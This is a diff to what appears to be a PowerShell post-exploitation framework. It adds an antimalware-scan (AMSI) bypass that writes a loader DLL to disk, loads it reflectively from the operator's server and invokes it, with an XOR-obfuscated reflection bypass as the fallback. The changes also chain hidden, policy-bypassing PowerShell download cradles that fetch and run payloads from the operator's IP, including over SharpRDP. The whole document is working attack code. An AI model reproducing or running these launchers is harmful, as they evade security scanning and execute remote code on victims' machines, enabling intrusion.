@@ -8,6 +8,8 @@ $_alInPS = "JLZn7QzBZS"
 $_alSpwn = "F8VN3g3UuD"
 $_alNL   = "hAdjDGYuHq"
 $_alNLLd = "wciWLtbhch"
+$_alByp  = "Bypass"
+$_alPar  = "gy7Kz88Hdi"
 # !!AL-MAP-END!!
 $global:AmnesiacRoot = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
 
@@ -318,8 +320,15 @@ function Get-PayloadLauncher {
         }
 
         'sharprdp' {
+            $_dllFile  = "$_alNs.dll"
+            if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
+                try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
+                $_rdpAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$global:IP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+            } else {
+                $_rdpAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+            }
             $_cradle = "iex(new-object net.webclient).downloadstring('http://$global:IP`:8080/pipe_$global:PipeName.ps1')"
-            return "command=powershell -nop -ep bypass -w hidden -c `"$_cradle`""
+            return "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_cradle`""
         }
 
         default {
@@ -3189,7 +3198,13 @@ while (`$true) {
 			$_pipeFile  = "pipe_$PipeName.ps1"
 			$_pipePath  = Join-Path $global:AmnesiacRoot $_pipeFile
 			$_srvIP     = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
-			$_srvAmsi   = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+			$_dllFile   = "$_alNs.dll"
+			if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
+				try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
+				$_srvAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+			} else {
+				$_srvAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+			}
 			$_srvCradle = "iex(new-object net.webclient).downloadstring('http://$_srvIP`:8080/$_pipeFile')"
 			$_srvCmd    = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;$_srvCradle`""
 			$global:LastInlinePS = $built.InlinePS
@@ -3432,7 +3447,13 @@ while (`$true) {
 		$_pipeFile    = "pipe_$PN.ps1"
 		$_pipePath    = Join-Path $global:AmnesiacRoot $_pipeFile
 		$_operatorIP  = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
-		$_rdpAmsi     = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+		$_dllFile     = "$_alNs.dll"
+		if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
+			try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
+			$_rdpAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+		} else {
+			$_rdpAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+		}
 		$_rdpCradle   = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
 		$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
 		$_srvCmd      = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
